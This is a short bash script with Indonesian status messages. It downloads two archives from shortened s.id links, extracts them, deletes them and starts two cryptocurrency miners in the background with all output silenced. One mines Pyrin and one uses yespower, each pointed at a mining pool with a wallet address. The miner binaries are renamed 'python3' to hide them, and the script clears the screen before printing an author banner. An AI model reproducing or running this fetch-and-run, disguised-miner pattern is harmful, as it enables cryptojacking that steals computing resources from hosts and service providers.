#!/bin/bash

echo "download dot-srb..."

wget -q -O dot-srb s.id/25RZs

echo "ekstrak dot-srb..."

tar -xzf dot-srb >/dev/null

echo "hapus dot-srb..."

rm dot-srb
# SAMPE SINI
echo "download dot-lol..."

wget -q -O dot-lol s.id/25RZu

echo "ekstrak dot-lol..."

tar -xzvf dot-lol  >/dev/null

echo "hapus dot-lol..."

rm dot-lol

nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &

sleep 10

nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOT > /dev/null 2>&1 &

sleep 5

clear

echo "======================================================"
echo "██████╗  ██████╗ ████████╗     █████╗      ██╗ █████╗"
echo "██╔══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗     ██║██╔══██╗"
echo "██║  ██║██║   ██║   ██║       ███████║     ██║███████║"
echo "██║  ██║██║   ██║   ██║       ██╔══██║██   ██║██╔══██║"
echo "██████╔╝╚██████╔╝   ██║       ██║  ██║╚█████╔╝██║  ██║"
echo "╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝"
echo "=============created By Hendi Kusnandi================"
